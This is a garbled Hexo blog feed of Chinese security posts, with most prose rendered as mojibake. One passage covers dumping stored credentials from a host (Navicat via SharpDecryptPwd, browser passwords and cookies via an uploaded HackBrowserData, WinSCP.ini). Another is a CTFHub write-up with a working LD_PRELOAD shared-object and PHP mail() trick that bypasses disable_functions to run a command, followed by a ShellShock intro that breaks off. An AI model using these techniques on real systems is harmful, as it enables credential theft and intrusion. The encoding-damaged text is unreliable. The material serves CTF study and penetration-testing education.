Name&gt;</td></tr></tbody></table><p>æ•°æ®åº“çš„è¿æ¥è®°å½•ä¸­çš„Pwdé”®çš„å€¼ä¸ºç»è¿‡Navicat&lt;&#x3D;11ç‰ˆæœ¬ç®—æ³•åŠ å¯†è¿‡åçš„å¯†ç ï¼Œå¯ä»¥åœ¨ç½‘ä¸Šæœç´¢è§£å¯†è„šæœ¬è§£å‡ºã€‚</p><p>ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ Navicat å¯¼å‡ºæ‰€æœ‰è¿æ¥ï¼Œå°†ç”Ÿæˆconnections.ncx æ–‡ä»¶ï¼Œä¿å­˜æ‰€æœ‰è¿æ¥è®°å½•ã€‚å…¶ä¸­ï¼Œâ€œPasswordâ€å¯¹åº”çš„å€¼å³ä½¿ç”¨ Navicat&gt;&#x3D;12 ç‰ˆæœ¬ç®—æ³•åŠ å¯†è¿‡åçš„å¯†ç ï¼Œå†å¯¹å…¶è¿›è¡Œè§£å¯†ã€‚</p><p>ä¸‹é¢å‘½ä»¤å¯ä»¥ä¸€é”®å¯¼å‡ºå½“å‰ä¸»æœºä¸Šç”¨æˆ·è¿æ¥è¿‡çš„æ‰€æœ‰æ•°æ®åº“çš„ç™»å½•å‡­æ®</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">SharpDecryptPwd.exe -NavicatCrypto<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745130.png" alt="image-20240325010347363"></p><p><strong>è·å–æµè§ˆå™¨ä¿å­˜çš„ç™»é™†å‡­æ®</strong></p><p>Web æµè§ˆå™¨é€šå¸¸ä¼šä¿å­˜ç½‘ç«™ç”¨æˆ·åå’Œå¯†ç ç­‰å‡­æ®ï¼Œä»¥é¿å…å¤šæ¬¡æ‰‹åŠ¨è¾“å…¥ã€‚é€šå¸¸ï¼Œç”¨æˆ·çš„å‡­æ®ä»¥åŠ å¯†æ ¼å¼å­˜å‚¨åœ¨æœ¬åœ°æ–‡ä»¶ä¸­ï¼Œæµ‹è¯•äººå‘˜å¯ä»¥é€šè¿‡è¯»å–ç‰¹å®šçš„æ–‡ä»¶ï¼Œä»Web æµè§ˆå™¨ä¸­è·å–å‡­æ®ã€‚</p><p>HackBrowserData æ˜¯ä¸€æ¬¾å¼€æºå·¥å…·ï¼Œå¯ä»¥ç›´æ¥ä»æµè§ˆå™¨è§£å¯†æ•°æ®åŒ…æ‹¬ç”¨æˆ·ç™»å½•å¯†ç ä¹¦ç­¾ã€Cookieã€å†å²è®°å½•ã€ä¿¡ç”¨å¡ã€ä¸‹è½½é“¾æ¥ç­‰ï¼Œæ”¯æŒæµè¡Œçš„æµè§ˆå™¨ï¼Œå¯åœ¨ Windowsã€macOS å’Œ Linuxå¹³å°ä¸Šè¿è¡Œï¼Œå·¥å…·åœ°å€ï¼š<a href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a></p><p>åªéœ€å°† HackBrowserData ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºï¼Œç„¶åç›´æ¥è¿è¡Œå³å¯ï¼Œæ‰§è¡Œå®Œæ¯•åï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ª result ç›®å½•ï¼ŒåŒ…å«å½“å‰ä¸»æœºä¸­å·²å®‰è£…çš„æ‰€æœ‰æµè§ˆå™¨ä¿å­˜çš„ç”¨æˆ·ç™»å½•å¯†ç ã€æµè§ˆå™¨ä¹¦ç­¾ã€Cookieã€å†å²è®°å½•ç­‰ä¿¡æ¯çš„ CSV æ–‡ä»¶ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151745131.png" alt="image-20240325005731788"></p><p>ç”¨excelæ‰“å¼€å°±å¯ä»¥çœ‹åˆ°è§£å¯†å‡ºæ¥çš„æ‰€æœ‰ç™»é™†å‡­æ®</p><p><strong>è·å–WinSCPä¿ç•™çš„ç™»é™†å‡­æ®</strong></p><p>WinSCPæ˜¯Windowsç¯å¢ƒä¸‹ä½¿ç”¨SSHçš„å¼€æºå›¾å½¢åŒ–SFTP å·¥å…·å®¢æˆ·ç«¯ã€‚åœ¨ä½¿ç”¨SFTPè¿æ¥æ—¶ï¼Œå¦‚æœå‹¾é€‰äº†â€œä¿å­˜å¯†ç â€ï¼ŒWinSCPå°±ä¼šå°†å¯†ç ä¿å­˜åœ¨WinSCP.iniæ–‡ä»¶ä¸‹ã€‚Winscppwdå·¥å…·åˆ™å¯ä»¥è¿›è¡Œè§£å¯†ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151745132.png" alt="image-20240325005905488"></p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfhubçš„disable_function</title>
      <link href="/2024/03/11/ctfhub%E7%9A%84disable-function/"/>
      <url>/2024/03/11/ctfhub%E7%9A%84disable-function/</url>
      
        <content type="html"><![CDATA[<p><strong>è¿™æ˜¯ctfhubçš„Bypass disable_functionçŸ¥è¯†ä½“ç³»</strong></p><p><img src="http://cdn.clown2024.cn/202407151439635.png" alt="image-20240311235539559"></p><p>å¥½å¤šæ–°ä¸œè¥¿èƒ½å­¦çš„ï¼Œæ¥ç ”ç©¶ä¸€ä¸‹ã€‚</p><h1 id="ld_preload"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h1><p><strong>è¿™é‡Œé¦–å…ˆæ¥äº†è§£ä¸€ä¸‹åŠ¨æ€é“¾æ¥åº“(ä¹Ÿå«å…±äº«åº“)ï¼Œè¿™éƒ¨åˆ†åœ¨æ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿè¿™æœ¬ä¹¦æœ‰è¯¦ç»†è¯´æ˜ï¼Œè¿™é‡Œç®€å•äº†è§£ä¸€ä¸‹</strong></p><p><strong>å…±äº«åº“</strong>ï¼ˆshared libraryï¼‰æ˜¯è‡´åŠ›äºè§£å†³é™æ€åº“ç¼ºé™·çš„ä¸€ä¸ªç°ä»£åˆ›æ–°äº§ç‰©ã€‚å…±äº«åº“æ˜¯ä¸€ä¸ªç›®æ ‡æ¨¡å—ï¼Œåœ¨è¿è¡Œæˆ–åŠ è½½æ—¶ï¼Œå¯ä»¥åŠ è½½åˆ°ä»»æ„çš„å†…å­˜åœ°å€ï¼Œå¹¶å’Œä¸€ä¸ªåœ¨å†…å­˜ä¸­çš„ç¨‹åºé“¾æ¥èµ·æ¥ã€‚è¿™ä¸ªè¿‡ç¨‹ç§°ä¸º<strong>åŠ¨æ€é“¾æ¥</strong>ï¼ˆdynamic linkingï¼‰ï¼Œæ˜¯ç”±ä¸€ä¸ªå«åš<strong>åŠ¨æ€é“¾æ¥å™¨</strong>ï¼ˆdynamic linkerï¼‰çš„ç¨‹åºæ¥æ‰§è¡Œçš„ã€‚å…±äº«åº“ä¹Ÿç§°ä¸º<strong>å…±äº«ç›®æ ‡</strong>ï¼ˆshared objectï¼‰ï¼Œåœ¨ Linux ç³»ç»Ÿä¸­é€šå¸¸ç”¨ .so åç¼€æ¥è¡¨ç¤ºã€‚å¾®è½¯çš„æ“ä½œç³»ç»Ÿå¤§é‡åœ°ä½¿ç”¨äº†å…±äº«åº“ï¼Œå®ƒä»¬ç§°ä¸º DLLï¼ˆåŠ¨æ€é“¾æ¥åº“ï¼‰ã€‚</p><p>ç¨‹åºç¼–è¯‘çš„å››ä¸ªè¿‡ç¨‹å¦‚å›¾(é¢„å¤„ç†ã€ç¼–è¯‘ã€æ±‡ç¼–ã€é“¾æ¥)ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151439637.png" alt="image-20240312001644436"></p><p>ä¸€ä¸ªç¤ºä¾‹ç¨‹åºçš„åŠ¨æ€é“¾æ¥çš„è¿‡ç¨‹å¦‚å›¾ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;vector.h&quot;</span></span><br><br><span class="hljs-type">int</span> x[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;;<br><span class="hljs-type">int</span> y[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;;<br><span class="hljs-type">int</span> z[<span class="hljs-number">2</span>];<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    addvec(x, y, z, <span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;z = [%d %d]\n&quot;</span>, z[<span class="hljs-number">0</span>], z[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151439638.png" alt="image-20240312001800286"></p><p>è¿™é‡Œä»‹ç»ä¸€ä¸ª<strong>lddå‘½ä»¤</strong>ï¼Œè¯¥å‘½ä»¤çš„ä½œç”¨æ˜¯ï¼šæ‰“å°ç¨‹åºæˆ–è€…åº“æ–‡ä»¶æ‰€ä¾èµ–çš„å…±äº«åº“åˆ—è¡¨</p><p>è¿™æ˜¯ä¸€ä¸ªç¤ºä¾‹ç¨‹åºï¼š</p><figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    vector&lt;string&gt; msg &#123;<span class="hljs-string">&quot;Hello&quot;</span>, <span class="hljs-string">&quot;C++&quot;</span>, <span class="hljs-string">&quot;World&quot;</span>, <span class="hljs-string">&quot;from&quot;</span>, <span class="hljs-string">&quot;VS Code&quot;</span>, <span class="hljs-string">&quot;and the C++ extension!&quot;</span>&#125;;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> string&amp; word : msg)<br>    &#123;<br>        cout &lt;&lt; word &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    cout &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ç”¨lddå»çœ‹ä¸‹ç¼–è¯‘ç”Ÿæˆçš„ç¨‹åºæ‰€ä¾èµ–çš„åº“</p><p><img src="http://cdn.clown2024.cn/202407151439639.png" alt="image-20240312002417051"></p><p><strong>çŸ¥é“ä¸Šé¢çš„åŸºç¡€ä¸œè¥¿ä¹‹åï¼Œå°±æ¥çœ‹ä¸€ä¸‹LD_PRELOAD</strong></p><blockquote><p> LD_PRELOADæ˜¯Linuxä¸­çš„ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œå®ƒå…è®¸ä½ å®šä¹‰åœ¨ç¨‹åºè¿è¡Œå‰ä¼˜å…ˆåŠ è½½çš„åŠ¨æ€é“¾æ¥åº“ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥åœ¨è‡ªå·±å®šä¹‰çš„åŠ¨æ€é“¾æ¥åº“ä¸­è£…å…¥æ¶æ„å‡½æ•°ã€‚</p><p>é‚£æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ld_preloadå»åŠ«æŒå‡½æ•°æ¥è¾¾åˆ°æˆ‘ä»¬æ‰§è¡Œæ¶æ„ä»£ç çš„ç›®çš„ï¼Œæ¯”å¦‚ä¸€ä¸ªæ–‡ä»¶ä¸­æœ‰ä¸€ä¸ªæ¶æ„æ„é€ çš„å‡½æ•°å’Œæˆ‘ä»¬ç¨‹åºæŒ‡ä»¤æ‰§è¡Œæ—¶è°ƒç”¨çš„å‡½æ•°ä¸€æ¨¡ä¸€æ ·ï¼Œè€ŒLD_PRELOADè·¯å¾„æŒ‡å‘è¿™ä¸ªæ–‡ä»¶åï¼Œè¿™ä¸ªæ–‡ä»¶çš„ä¼˜å…ˆçº§é«˜äºåŸæœ¬å‡½æ•°çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆä¼˜å…ˆè°ƒç”¨æˆ‘ä»¬çš„æ¶æ„æ–‡ä»¶åä¼šè¦†ç›–åŸæœ¬çš„é‚£ä¸ªå‡½æ•°ï¼Œæœ€åå½“æˆ‘ä»¬æ‰§è¡Œäº†ä¸€ä¸ªæŒ‡ä»¤åå®ƒä¼šè‡ªåŠ¨è°ƒç”¨ä¸€æ¬¡æ¶æ„çš„å‡½æ•°ï¼Œä¹Ÿæ˜¯ç”¨è‡ªå·±å†™çš„æ¶æ„çš„soæ–‡ä»¶å»è¦†ç›–ã€‚</p></blockquote><p><strong>è¿™é‡Œç”¨ä¸€ä¸ªéšæœºæ•°å‡½æ•°çš„åŠ«æŒæ¥æ¼”ç¤ºä¸€ä¸‹</strong></p><p>ç”Ÿæˆéšæœºæ•°çš„ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;time.h&gt;</span> </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>srand(time(<span class="hljs-literal">NULL</span>)); <span class="hljs-comment">//éšæœºç”Ÿæˆç§å­ï¼Œä¿è¯æ¯æ¬¡å‡ºç°çš„éšæœºæ•°ä¸ç›¸åŒ</span><br>    <span class="hljs-type">int</span> i = <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">while</span>(i--) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,rand());<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gcc -o rand randnum.c<br><br>./rand<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151439640.png" alt="image-20240312003634363"></p><p>æ¥ä¸‹æ¥å†™ä¸€ä¸ªç”¨äºåŠ«æŒçš„å‡½æ•°</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//unrand.c</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">rand</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">666</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åç”¨ä¸‹é¢çš„å‘½ä»¤ç”Ÿæˆsoæ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">gcc -shared -fPIC è‡ªå®šä¹‰æ–‡ä»¶.c -o ç”Ÿæˆçš„åº“æ–‡ä»¶.so</span><br>gcc -shared -fPIC unrand.c -o unrand.so<br>export LD_PRELOAD=$PWD/unrand.so<br><span class="hljs-meta prompt_">#</span><span class="language-bash">-fpic é€‰é¡¹æŒ‡ç¤ºç¼–è¯‘å™¨ç”Ÿæˆä¸ä½ç½®æ— å…³çš„ä»£ç ,-shared é€‰é¡¹æŒ‡ç¤ºé“¾æ¥å™¨åˆ›å»ºä¸€ä¸ªå…±äº«çš„ç›®æ ‡æ–‡ä»¶</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">unset</span> LD_PRELOAD å¯ä»¥è¿˜åŸå‡½æ•°å…³ç³»</span><br></code></pre></td></tr></table></figure><p>ç„¶åç”¨lddå‘½ä»¤å»çœ‹ä¸€ä¸‹å‰ååŠ¨æ€åº“åŠ è½½çš„é¡ºåº</p><p><img src="http://cdn.clown2024.cn/202407151504959.png" alt="image-20240312004616502"></p><p><img src="http://cdn.clown2024.cn/202407151504960.png" alt="image-20240312004626732"></p><p>å¯ä»¥çœ‹å‡ºæ¥å…¶ä¸­çš„randçš„å‡½æ•°è¢«æˆ‘ä»¬æˆåŠŸåŠ«æŒäº†ã€‚</p><p>å¦‚æœä¸çŸ¥é“è°ƒç”¨äº†ä»€ä¹ˆå‡½æ•°æˆ‘ä»¬è¿˜å¯ä»¥ç”¨ä¸‹é¢ä¸¤ä¸ªå‘½ä»¤å»è·Ÿä¸€ä¸‹ç³»ç»Ÿè°ƒç”¨çš„æƒ…å†µ,ä½†æ˜¯è¿™ä¸¤ä¸ªè·Ÿè¸ªçš„é‡ç‚¹æœ‰æ‰€ä¸åŒ</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">strace a.out  #è·Ÿè¸ªç³»ç»Ÿè°ƒç”¨å’Œä¿¡å·<br>ltrace a.out  #ç”¨æ¥è·Ÿè¸ªè¿›ç¨‹è°ƒç”¨åº“å‡½æ•°çš„æƒ…å†µ<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151439643.png" alt="image-20240319163751066"></p><p><img src="http://cdn.clown2024.cn/202407151439644.png" alt="image-20240319163811697"></p><p>æ‰€ä»¥æƒ³è¦åŠ«æŒå…·ä½“å‡½æ•°çš„æ—¶å€™å¯ä»¥ç”¨ltraceè¿™ä¸ªå‘½ä»¤æ›´æ¸…æ™°</p><p>è¿˜æœ‰ä¸€ä¸ª<strong>readelf</strong>å‘½ä»¤å¯ä»¥ç”¨æ¥æŸ¥çœ‹elfæ–‡ä»¶çš„ä¿¡æ¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">readelf -s &lt;ELFæ–‡ä»¶&gt; #å¯ä»¥æ˜¾ç¤ºåŒ…å«åœ¨å¯æ‰§è¡Œæ–‡ä»¶æˆ–å…±äº«åº“ä¸­çš„æ‰€æœ‰ç¬¦å·ï¼ŒåŒ…æ‹¬å‡½æ•°ç¬¦å·<br></code></pre></td></tr></table></figure><blockquote><p>æ›´å¤šçš„ä¸œè¥¿å‚è€ƒè¿™ä¸¤ç¯‡æ–‡ç« ï¼š<a href="https://blog.csdn.net/qq_63701832/article/details/129760495">LD_PRELOADåŠ«æŒï¼ˆè¶…è¯¦ç»†ç¯‡ï¼‰-CSDNåšå®¢</a>ï¼Œ<a href="https://cs.pynote.net/se/202203301/#_1">ç”¨LD_PRELOADåŠ«æŒçš„åŸç†å’Œå®è·µ | CSç¬”è®° (pynote.net)</a></p></blockquote><p><strong>ç°åœ¨çœ‹å›è¿™é“é¢˜</strong></p><p><img src="http://cdn.clown2024.cn/202407151504961.png" alt="image-20240312220351561"></p><p>è¿™ä¸ªé¡µé¢ç›´æ¥å°±æ˜¯ä¸€ä¸ªshellï¼Œé‚£æˆ‘ä»¬ç›´æ¥èšå‰‘å»è¿æ¥ï¼Œç”¨è™šæ‹Ÿç»ˆç«¯æ‰§è¡Œäº†ä¸€ä¸‹å‘½ä»¤ï¼Œå‘ç°æ‰§è¡Œä¸äº†çš„</p><p><img src="http://cdn.clown2024.cn/202407151504962.png" alt="image-20240312220455165"></p><p>è¿™é‡Œå°±æ˜¯å› ä¸ºdisable_functionç¦ç”¨äº†æ‰€æœ‰å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°ï¼Œæ‰€ä»¥è¿™é‡Œå°±è¦ç”¨åˆ°ld_preloadåŠ«æŒçš„æ–¹æ³•äº†ï¼Œæˆ‘ä»¬å»çœ‹ç›®å½•æ˜¯æœ‰ä¸€ä¸ª&#x2F;flagçš„ï¼Œä½†æ˜¯æ²¡æœ‰ä¸œè¥¿åº”è¯¥ä¹Ÿæ˜¯å› ä¸ºå‡½æ•°ç¦ç”¨çš„åŸå› ï¼Œç„¶åè¿˜æœ‰ä¸€ä¸ª&#x2F;readflagç¨‹åºï¼Œåº”è¯¥å°±æ˜¯è¦è°ƒç”¨é‚£ä¸ªç¨‹åºæ¥è¯»flag</p><p>è¿™é‡Œå…ˆåœ¨æœ¬åœ°Linuxä¸Šå†™ä¸€ä¸ªhack.cç¨‹åºï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br> <br>__attribute__ ((__constructor__)) <span class="hljs-type">void</span> <span class="hljs-title function_">angel</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    system(<span class="hljs-string">&quot;/readflag &gt; /tmp/eval.txt&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åç”Ÿæˆhack.soæ–‡ä»¶,ä¸Šä¼ åˆ°&#x2F;tmpç›®å½•ä¸‹</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gcc -shared -fPIC hack.c -o hack.so<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151504963.png" alt="image-20240312221737068"></p><p>ç„¶åæˆ‘ä»¬å†å†™ä¸€ä¸ªphpæ–‡ä»¶ç”¨äºä¿®æ”¹ç¯å¢ƒå˜é‡å¹¶ç”¨äºè°ƒç”¨è¢«åŠ«æŒçš„å‡½æ•°æ¥è¯»flag</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;ld_preload=/tmp/hack.so&quot;</span>);<br><br><span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-title function_ invoke__">mail</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œçš„ld_preloadå°å†™å¯èƒ½ä¸æˆåŠŸï¼Œéœ€è¦æ”¹æˆå¤§å†™ï¼Œè¢«å›½èµ›å‘äº†ä¸€æ¬¡wcğŸ¥²</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151504964.png" alt="image-20240312221702596"></p><p>ç„¶åå»includeä¸€ä¸‹ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151439649.png" alt="image-20240312222556100"></p><p>å°±å¯ä»¥çœ‹åˆ°&#x2F;tmpç›®å½•ä¸€ä¸‹æœ‰flagäº†</p><p><img src="http://cdn.clown2024.cn/202407151504966.png" alt="image-20240312222624367"></p><p>ç°åœ¨æ¥è§£é‡Šä¸€ä¸‹ä¸Šé¢çš„åŸç†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">__attribute__((constructor)) æ˜¯ä¸€ç§ GNU C è¯­è¨€æ‰©å±•ï¼Œç”¨äºè®¾ç½®å‡½æ•°å±æ€§ã€‚<br><br>__attribute__ æ˜¯ä¸€ä¸ªç‰¹æ€§ï¼ˆattributeï¼‰æœºåˆ¶ï¼Œå®ƒå…è®¸ä½ ä¸ºå‡½æ•°ã€å˜é‡æˆ–ç±»å‹æ·»åŠ é¢å¤–çš„å±æ€§ã€‚è¿™äº›å±æ€§å¯ä»¥å½±å“ç¼–è¯‘å™¨çš„è¡Œä¸ºï¼Œä»è€Œä¼˜åŒ–ç¨‹åºçš„æ€§èƒ½ã€å¯ç§»æ¤æ€§å’Œå¯è¯»æ€§ã€‚<br><br>__attribute__((constructor)) ç”¨äºæŒ‡å®šä¸€ä¸ªå‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šåœ¨ç¨‹åºå¯åŠ¨æ—¶è‡ªåŠ¨æ‰§è¡Œï¼Œå¹¶ä¸”åœ¨ main() å‡½æ•°ä¹‹å‰ã€‚<br><br>ç±»ä¼¼åœ°ï¼Œè¿˜æœ‰ __attribute__((destructor))ï¼Œå®ƒä¼šåœ¨ main() å‡½æ•°é€€å‡ºæˆ–è°ƒç”¨ exit() åè‡ªåŠ¨æ‰§è¡Œã€‚è¿™å¯¹äºé‡Šæ”¾èµ„æºæˆ–æ¸…ç†å·¥ä½œéå¸¸æœ‰ç”¨ã€‚<br><br>ä½ è¿˜å¯ä»¥ä¸ºå±æ€§è®¾ç½®ä¼˜å…ˆçº§ï¼Œä¾‹å¦‚ï¼š__attribute__((constructor(101))) void before1();è¿™å°†æŒ‰ç…§ä¼˜å…ˆçº§é¡ºåºè°ƒç”¨å¸¦æœ‰ constructor å±æ€§çš„å‡½æ•°ã€‚<br><br>æ³¨æ„ï¼Œ__attribute__ æ˜¯ GCC ç¼–è¯‘å™¨çš„æ‰©å±•è¯­æ³•ï¼Œä¸æ˜¯æ ‡å‡† C è¯­è¨€çš„ä¸€éƒ¨åˆ†ï¼Œå› æ­¤åœ¨ä½¿ç”¨æ—¶éœ€è¦è€ƒè™‘å¯ç§»æ¤æ€§é—®é¢˜ã€‚<br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œç”¨mail()å’Œerror_log()çš„åŸå› æ˜¯å› ä¸ºä»–ä»¬éƒ½ä¼šå»è°ƒç”¨å¤–éƒ¨çš„&#x2F;usr&#x2F;sbin&#x2F;sendmailç¨‹åºç”¨æ¥å‘é€é‚®ä»¶ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥å› æ­¤è€ŒåŠ«æŒï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤å»æŸ¥çœ‹ä¸€ä¸‹è·Ÿè¸ªä¸€ä¸‹è¯¥å‡½æ•°çš„è°ƒç”¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">strace -f -e trace=execve php 1.php<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151439651.png" alt="image-20240319170122690"></p><p>ç„¶åæˆ‘ä»¬è¿˜å¯ä»¥ç”¨å‘½ä»¤å»æŸ¥çœ‹è¯¥ç¨‹åºè°ƒç”¨äº†ä»€ä¹ˆå‡½æ•°</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">readelf -Ws /usr/sbin/sendmail<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151439652.png" alt="image-20240312225539592"></p><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥å»é’ˆå¯¹é‡Œé¢çš„ä¸€äº›å‡½æ•°å»åŠ«æŒï¼Œæ•ˆæœæ˜¯ä¸€æ ·çš„ã€‚</p></blockquote><h1 id="shellshock"><a href="#ShellShock" class="headerlink" title="ShellShock"></a>ShellShock</h1><p>shellshockæ˜¯ä¸€ä¸ªåœ¨2014è¢«å…¬å¸ƒçš„å’Œbashæœ‰å…³çš„æ¼æ´</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.zhihu.com/tardis/zm/art/35579956?source_id=1003">ä»€ä¹ˆæ˜¯ShellShockæ”»å‡»ï¼Ÿ (zhihu.com)</a></p><p><strong>å°±å…ˆæ¥äº†è§£ä¸€ä¸‹bash</strong></p><blockquote><p>bashæ˜¯ä¸€ä¸ªshellç¯å¢ƒï¼Œå®ƒå…è®¸ç”¨æˆ·è¾“å…¥å‘½ä»¤æ¥ä¸æ“ä½œç³»ç»Ÿè¿›è¡Œäº¤äº’ï¼Œæ‰§è¡Œå„ç§ä»»åŠ¡ã€‚</p></blockquote><p>æˆ‘ä»¬æ¯æ¬¡è¾“å…¥bashçš„æ—¶å€™ï¼Œç³»ç»Ÿå°±ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„å­è¿›ç¨‹ï¼Œè€Œä¸”æ¶‰åŠåˆ°forkå’Œexecè¿™ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨çš„é…åˆï¼Œå…¶ä¸­çš„è¿‡ç¨‹æœ‰ä¸‹é¢å‡ ä¸ªæ­¥éª¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.forkè°ƒç”¨ï¼šå½“Bashéœ€è¦åˆ›å»ºä¸€ä¸ªæ–°çš„å­è¿›ç¨‹æ—¶ï¼Œå®ƒé¦–å…ˆè°ƒç”¨forkã€‚è¿™ä¸ªè°ƒç”¨ä¼šåˆ›å»ºä¸€ä¸ªä¸å½“å‰è¿›ç¨‹ï¼ˆçˆ¶è¿›ç¨‹ï¼‰å‡ ä¹å®Œå…¨ç›¸åŒçš„æ–°è¿›ç¨‹ï¼ˆå­è¿›ç¨‹ï¼‰ã€‚å­è¿›ç¨‹ä¼šå¤åˆ¶çˆ¶è¿›ç¨‹çš„å†…å­˜ç©ºé—´ï¼ŒåŒ…æ‹¬ä»£ç æ®µã€æ•°æ®æ®µå’Œå †æ 